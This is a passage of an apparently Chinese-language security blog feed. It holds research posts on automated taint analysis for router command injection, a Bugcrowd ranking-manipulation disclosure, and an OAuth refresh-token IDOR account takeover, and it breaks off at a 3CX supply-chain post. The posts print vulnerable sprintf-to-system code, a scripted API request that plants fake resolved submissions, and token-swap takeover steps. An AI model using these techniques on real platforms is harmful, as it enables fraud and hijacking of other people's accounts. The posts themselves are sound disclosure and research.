        <pubDate>Sat, 09 Aug 2025 07:13:29 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8C%96%E6%8E%98%E5%9F%BA%E4%BA%8E%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E7%9A%84%E8%A7%84%E6%A8%A1%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/</guid>
        <description>&lt;h1 id=&#34;基于污点分析的路由器固件漏洞规模化挖掘&#34;&gt;基于污点分析的路由器固件漏洞规模化挖掘
&lt;/h1&gt;&lt;p&gt;在最近几个月的工作中，我们开发了一套基于污点分析的自动化工具，用于检测路由器中的安全漏洞。该工具针对D-Link DIR-878路由器1.12A1固件中的CVE-2019-8312至CVE-2019-8319等命令注入漏洞进行了优化设计，目标是实现比人工分析更快的漏洞发现速度。&lt;/p&gt;
&lt;h2 id=&#34;技术方案&#34;&gt;技术方案
&lt;/h2&gt;&lt;h3 id=&#34;现有工具局限性&#34;&gt;现有工具局限性
&lt;/h3&gt;&lt;p&gt;虽然Triton和bincat等成熟污点分析工具存在，但它们不支持目标设备使用的MIPS架构，因此我们选择基于angr框架开发定制方案。&lt;/p&gt;
&lt;h3 id=&#34;angr符号执行的瓶颈&#34;&gt;angr符号执行的瓶颈
&lt;/h3&gt;&lt;p&gt;初始方案使用angr的符号执行功能进行动态污点跟踪，但面临状态爆炸问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;单个函数分析超时设置为2分钟&lt;/li&gt;
&lt;li&gt;实际分析耗时超过2小时&lt;/li&gt;
&lt;li&gt;存在内存泄漏导致内存耗尽&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;改进方案到达定义分析&#34;&gt;改进方案：到达定义分析
&lt;/h3&gt;&lt;p&gt;最终采用angr的Reaching Definitions静态分析技术：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;构建函数内的use-def关系图&lt;/li&gt;
&lt;li&gt;将原子操作（寄存器/栈变量/堆变量）建模为图节点&lt;/li&gt;
&lt;li&gt;通过图遍历分析用户输入（source）是否影响危险函数（sink）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;示例漏洞代码分析：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;vuln&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;querystring&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;get_querystring_value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;querystring&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nf&#34;&gt;sprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;echo %s &amp;gt;&amp;gt; /tmp/log&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nf&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;对应的use-def关系图清晰地展示了从&lt;code&gt;get_querystring_value&lt;/code&gt;到&lt;code&gt;system&lt;/code&gt;的污染传播路径。&lt;/p&gt;
&lt;h2 id=&#34;漏洞发现成果&#34;&gt;漏洞发现成果
&lt;/h2&gt;&lt;h3 id=&#34;prolink-prc2402m路由器&#34;&gt;PROLiNK PRC2402M路由器
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;发现20个命令注入漏洞（10个可通过WAN接口未授权访问）&lt;/li&gt;
&lt;li&gt;典型漏洞模式：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;qos_sta_settings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;cli_list&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;web_get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;cli_list&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;sprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/sbin/sta_qos.sh setup %s&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cli_list&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;额外发现：
&lt;ul&gt;
&lt;li&gt;硬编码后门密码&lt;code&gt;user&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;栈溢出漏洞（未检查边界的sprintf）&lt;/li&gt;
&lt;li&gt;拒绝服务漏洞（通过超大循环值导致无限循环）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;d-link-dir系列路由器&#34;&gt;D-Link DIR系列路由器
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;DIR-1960：发现4个需认证的HNAP API命令注入&lt;/li&gt;
&lt;li&gt;DIR-X1560（ARM架构）：
&lt;ul&gt;
&lt;li&gt;逆向分析复杂的分层架构（DAL/RCL/RUT）&lt;/li&gt;
&lt;li&gt;通过MDMOID映射表定位漏洞链&lt;/li&gt;
&lt;li&gt;最终发现4个深层命令注入漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;技术演示&#34;&gt;技术演示
&lt;/h2&gt;&lt;p&gt;工具将分析时间从2小时缩短至2分钟，效率提升60倍。目前主要支持命令注入检测，未来计划扩展缓冲区溢出、UAF等漏洞类型的检测能力。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;完整漏洞细节和厂商修复时间线请参阅原文技术分析部分。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>我是如何操纵Bugcrowd平台排名的 - 漏洞挖掘技术解析</title>
        <link>http://localhost:1313/p/%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E6%93%8D%E7%BA%B5bugcrowd%E5%B9%B3%E5%8F%B0%E6%8E%92%E5%90%8D%E7%9A%84-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Fri, 08 Aug 2025 22:06:25 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E6%93%8D%E7%BA%B5bugcrowd%E5%B9%B3%E5%8F%B0%E6%8E%92%E5%90%8D%E7%9A%84-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;如何操纵我在bugcrowd平台的排名&#34;&gt;如何操纵我在Bugcrowd平台的排名
&lt;/h1&gt;&lt;p&gt;近年来，随着越来越多的公司依赖众包平台来识别系统漏洞，漏洞赏金计划获得了极大的普及。因此，这些平台的安全性变得愈发关键。去年我发现了一个可以操纵Bugcrowd平台排名的方法，本文将分享具体实现方式及其潜在影响。&lt;/p&gt;
&lt;h2 id=&#34;漏洞背景&#34;&gt;漏洞背景
&lt;/h2&gt;&lt;p&gt;在测试Bugcrowd平台时，我发现可以通过API导入大量报告并给自己奖励积分来操纵平台排名。虽然这些是演示积分不会显示在个人公开主页，但它们会出现在提交页面的积分总计中——而这些演示积分会被计入平台的排名算法。通过此漏洞，我仅凭3205分就位列平台第10名，而原本第11名的研究者拥有13789分。&lt;/p&gt;
&lt;h2 id=&#34;技术实现细节&#34;&gt;技术实现细节
&lt;/h2&gt;&lt;p&gt;该漏洞需要以下操作步骤：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在Bugcrowd创建两个账户：研究员账户和公司账户&lt;/li&gt;
&lt;li&gt;从跟踪账户创建演示程序并获取API凭证&lt;/li&gt;
&lt;li&gt;按照官方文档构造API请求，为研究员账户创建可认领的提交&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;示例API请求代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s1&#34;&gt;&amp;#39;accept&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;application/vnd.bugcrowd+json&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s1&#34;&gt;&amp;#39;authorization&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Token &amp;lt;ADD-YOUR-API-TOKEN&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s1&#34;&gt;&amp;#39;content-type&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;application/json&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;{&amp;#34;submission&amp;#34;:{&amp;#34;source&amp;#34;:&amp;#34;platform&amp;#34;,&amp;#34;title&amp;#34;:&amp;#34;Security Breached&amp;#34;,&amp;#34;submitted_at&amp;#34;:&amp;#34;2022-06-07T00:00:00.181Z&amp;#34;,&amp;#34;substate&amp;#34;:&amp;#34;resolved&amp;#34;,&amp;#34;vrt_id&amp;#34;:&amp;#34;server_side_injection.remote_code_execution_rce&amp;#34;,&amp;#34;priority&amp;#34;:&amp;#34;1&amp;#34;,&amp;#34;researcher_email&amp;#34;:&amp;#34;muhammadkhizerjaved@bugcrowdninja.com&amp;#34;}}&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;https://api.bugcrowd.com/bounties/&amp;lt;YOUR-BOUNTY-UUID&amp;gt;/submissions&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;请求成功后，研究员邮箱会收到可认领提交的链接，认领后即可获得演示积分。当积累足够积分后，平台排名就会发生变化。&lt;/p&gt;
&lt;h2 id=&#34;漏洞影响&#34;&gt;漏洞影响
&lt;/h2&gt;&lt;p&gt;该漏洞主要影响Bugcrowd的商业信誉及其关联方，因为排名系统是平台用户信任体系的重要组成部分。攻击者可能通过操纵排名获取间接经济利益，例如在公开平台展示虚假排名，导致企业声誉受损和客户信任流失。&lt;/p&gt;
&lt;h2 id=&#34;负责任的披露&#34;&gt;负责任的披露
&lt;/h2&gt;&lt;p&gt;我及时向Bugcrowd报告了该问题，他们迅速进行了修复。这次经历让我深刻认识到负责任的漏洞披露的重要性，以及漏洞赏金计划对保障数字世界安全的关键作用。&lt;/p&gt;
&lt;p&gt;随着漏洞赏金计划的普及，保持警惕并识别潜在可利用漏洞显得尤为重要。我呼吁研究者和企业共同重视安全问题，携手打造更安全的互联网环境。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>不安全的刷新令牌使用导致账户接管漏洞(IDOR)</title>
        <link>http://localhost:1313/p/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%88%B7%E6%96%B0%E4%BB%A4%E7%89%8C%E4%BD%BF%E7%94%A8%E5%AF%BC%E8%87%B4%E8%B4%A6%E6%88%B7%E6%8E%A5%E7%AE%A1%E6%BC%8F%E6%B4%9Eidor/</link>
        <pubDate>Fri, 08 Aug 2025 03:33:33 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%88%B7%E6%96%B0%E4%BB%A4%E7%89%8C%E4%BD%BF%E7%94%A8%E5%AF%BC%E8%87%B4%E8%B4%A6%E6%88%B7%E6%8E%A5%E7%AE%A1%E6%BC%8F%E6%B4%9Eidor/</guid>
        <description>&lt;h1 id=&#34;不安全的刷新令牌使用导致账户接管idor&#34;&gt;不安全的刷新令牌使用导致账户接管(IDOR)
&lt;/h1&gt;&lt;h2 id=&#34;引言&#34;&gt;引言
&lt;/h2&gt;&lt;p&gt;在这篇文章中，我将详细说明一个存在于认证域而非主应用域的IDOR漏洞。通过滥用OAuth2刷新令牌流程，我能够获取任意用户的JWT访问令牌。利用该令牌，我可以完全冒充平台上的任何用户，最终导致完整的账户接管(ATO)。&lt;/p&gt;
&lt;h2 id=&#34;问题发现过程&#34;&gt;问题发现过程
&lt;/h2&gt;&lt;p&gt;在浏览网站时，我经常将有趣的请求转发到Burp Repeater进行进一步测试。某天，当我把一个请求留在Repeater中约10分钟后再次发送时，收到了401未授权响应。&lt;/p&gt;
&lt;p&gt;这很不寻常 - 因为当我在浏览器中执行相同操作时，它正常工作且没有要求重新登录。这引起了我的好奇。&lt;/p&gt;
&lt;p&gt;我决定被动监控从浏览器到服务器的网络请求，而不手动与页面交互。&lt;/p&gt;
&lt;h2 id=&#34;发现步骤&#34;&gt;发现步骤
&lt;/h2&gt;&lt;p&gt;我注意到一个POST请求被发送到认证域：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;POST https://auth.target.com/oauth/token
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;该请求返回了用户的新JWT令牌(access_token)。发送的唯一参数是：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;grant_type=refresh_token
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;refresh_token=&amp;lt;token&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;client_id=&amp;lt;client_id&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;参数测试&#34;&gt;参数测试
&lt;/h2&gt;&lt;p&gt;我观察到使用相同接口的不同账户的client_id是相同的。
例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过www.target.com登录 → client_id=xxxx&lt;/li&gt;
&lt;li&gt;通过community.target.com登录 → client_id=yyyy&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这里重要的参数是refresh_token。为了进一步测试，我：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;创建第二个账户&lt;/li&gt;
&lt;li&gt;获取第二个账户的refresh_token&lt;/li&gt;
&lt;li&gt;在第一个账户的会话中使用该refresh_token发送相同的POST请求&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;服务器返回了第二个账户的JWT令牌。这意味着我可以：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;访问第二个用户的账户&lt;/li&gt;
&lt;li&gt;查看和编辑他们的个人资料&lt;/li&gt;
&lt;li&gt;以他们的身份执行任何操作&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;错误配置&#34;&gt;错误配置
&lt;/h2&gt;&lt;p&gt;此漏洞源于认证流程中的两个关键缺陷：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;缺乏绑定：服务器不验证正在使用的刷新令牌是否确实属于当前认证的用户/会话&lt;/li&gt;
&lt;li&gt;静态刷新令牌：refresh_token数月保持不变，意味着被盗/泄露的令牌可以无限期重复使用&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;建议&#34;&gt;建议
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;始终观察令牌交换，特别是前端和认证服务之间的交换&lt;/li&gt;
&lt;li&gt;小的异常行为(如不一致的错误或缺少重新认证)可能导致严重漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;不幸的是，由于refresh_token使用的是不可猜测的UUID，且无法通过受害者个人资料交互获取，他们将其评定为P5级别漏洞。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>3CX供应链攻击内幕：国家级APT组织的复杂攻击链分析</title>
        <link>http://localhost:1313/p/3cx%E4%BE%9B%E5%BA%94%E9%93%BE%E6%94%BB%E5%87%BB%E5%86%85%E5%B9%95%E5%9B%BD%E5%AE%B6%E7%BA%A7apt%E7%BB%84%E7%BB%87%E7%9A%84%E5%A4%8D%E6%9D%82%E6%94%BB%E5%87%BB%E9%93%BE%E5%88%86%E6%9E%90/</link>
        <pubDate>Thu, 07 Aug 2025 20:47:01 +0800</pubDate>
        
        <guid>http://localhost:1313/p/3cx%E4%BE%9B%E5%BA%94%E9%93%BE%E6%94%BB%E5%87%BB%E5%86%85%E5%B9%95%E5%9B%BD%E5%AE%B6%E7%BA%A7apt%E7%BB%84%E7%BB%87%E7%9A%84%E5%A4%8D%E6%9D%82%E6%94%BB%E5%87%BB%E9%93%BE%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;统一通信供应商3cx上周确认遭受供应链攻击但攻击源头仍不明确&#34;&gt;统一通信供应商3CX上周确认遭受供应链攻击，但攻击源头仍不明确。
